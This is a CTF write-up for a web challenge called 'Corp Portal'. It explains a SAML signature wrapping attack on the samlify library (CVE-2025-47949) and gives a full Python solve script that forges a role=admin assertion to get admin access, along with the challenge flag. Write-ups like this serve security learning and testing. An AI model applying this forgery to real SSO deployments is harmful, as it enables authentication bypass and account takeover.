---
title: "Corp Portal"
ctf: "Hackastra 2026 CTF"
date: 2026-05-29
category: web
difficulty: medium
points: 257
flag_format: "FLAG{...}"
author: "CL4Y"
---

# Corp Portal

## Summary

A corporate SSO portal built on the Node **samlify** library. The Service Provider checks the IdP's XML-DSig signature but, on the *message-level* signature code path, never ties the signed reference back to the assertion it actually consumes. By relocating the genuine `<Signature>` to be a direct child of `<Response>` and inserting a forged `role=admin` assertion, the response verifies while the SP reads attacker-controlled claims — a SAML **Signature Wrapping** attack (CVE-2025-47949).

## Solution

### Step 1: Recon the SSO flow

`/` redirects to `/sp/`. Signing up at `/idp/register` and logging in walks a textbook SAML POST flow:

`/sp/login` → IdP `/idp/sso` (credentials) → auto-submitting form POSTs a base64 `SAMLResponse` to `/sp/acs`.

The decoded assertion carries `role=user`, and `/sp/admin` returns **403** (`Current role: user`). The role is asserted by the IdP and the assertion is signed, so escalation requires forging a validly-signed `role=admin` assertion.

Tampering surfaced samlify's internal error constants (`ERR_ZERO_SIGNATURE`, `ERR_FAILED_TO_VERIFY_SIGNATURE`, `ERR_POTENTIAL_WRAPPING_ATTACK`), fingerprinting the library and pointing at CVE-2025-47949.

### Step 2: Find the unchecked code path

Reading `libsaml.js::verifySignature` (samlify < 2.10.0) reveals two branches:

- **Assertion-level signature** (`/Response/Assertion/Signature`): enforces `signature.refURI === firstAssertion.ID` → defeats naive wrapping.
- **Message-level signature** (`/Response/Signature`): takes a *different* branch that simply grabs the single `/Response/Assertion` — **no refURI check**.

So: move the real `<Signature>` up to be a child of `<Response>`, make a forged `role=admin` assertion the sole `/Response/Assertion`, and stash the genuine signed assertion content (minus its signature, so its exclusive-c14n digest still matches `#<id>`) in a sibling wrapper. xml-crypto resolves the reference and validates the digest/signature; samlify then hands the SP the *forged* admin assertion. (Use a different ID on the forged assertion to dodge xml-crypto's duplicate-ID guard.)

### Step 3: Mint a fresh response and fire

Assertions expire ~5 minutes after issue (`NotOnOrAfter`), so the exploit must generate a fresh signed response and submit the wrapped version immediately.

```python
#!/usr/bin/env python3
import base64, re, urllib.parse, requests

B = "http://challenges.ctf.hackastra.tech:30355"

def fresh_signed_response():
    """Register + complete the SAML flow, return the decoded signed Response XML."""
    s = requests.Session()
    s.post(f"{B}/idp/register", data={"email": "h3@corp.local", "password": "pw123"})
    loc = s.get(f"{B}/sp/login", allow_redirects=False).headers["Location"]
    samlreq = urllib.parse.unquote(loc.split("SAMLRequest=")[1])
    r = s.post(f"{B}/idp/sso", data={
        "email": "h3@corp.local", "password": "pw123",
        "SAMLRequest": samlreq, "RelayState": ""})
    resp_b64 = re.search(r'name="SAMLResponse" value="([^"]+)"', r.text).group(1)
    return base64.b64decode(resp_b64).decode()

def wrap(orig):
    """Build the signature-wrapped admin response."""
    aid = re.search(r'<saml:Assertion\b[^>]*\bID="([^"]+)"', orig).group(1)
    am  = re.search(r'<saml:Assertion\b.*?</saml:Assertion>', orig, re.S)
    pre, post = orig[:am.start()], orig[am.end():]
    sig = re.search(r'<Signature\b.*?</Signature>', am.group(0), re.S).group(0)
    gen_nosig = am.group(0).replace(sig, "")                       # exact digest target
    forged = (gen_nosig
              .replace(aid, "_forgedAAAAAAAAAAAAAAAAAAAAAAAAAA")   # unique ID
              .replace("<saml:AttributeValue>user</saml:AttributeValue>",
                       "<saml:AttributeValue>admin</saml:AttributeValue>"))
    # Signature -> child of <Response>; forged assertion = sole /Response/Assertion;
    # genuine content hidden in <wrap> so #<id> still resolves for the digest check.
    return pre + sig + "\n" + forged + "\n<wrap>" + gen_nosig + "</wrap>\n" + post

def admin(xml):
    s = requests.Session()
    enc = base64.b64encode(xml.encode()).decode()
    s.post(f"{B}/sp/acs", data={"SAMLResponse": enc, "RelayState": ""}, allow_redirects=False)
    return s.get(f"{B}/sp/admin", allow_redirects=False).text

body = admin(wrap(fresh_signed_response()))
print(re.search(r'FLAG\{[^}]*\}', body).group(0))
```

```text
$ python3 solve.py
FLAG{WRaPp3D_lIKE_A_burRI7o_adf5798f23d1}
```

## Flag

```
FLAG{WRaPp3D_lIKE_A_burRI7o_adf5798f23d1}
```
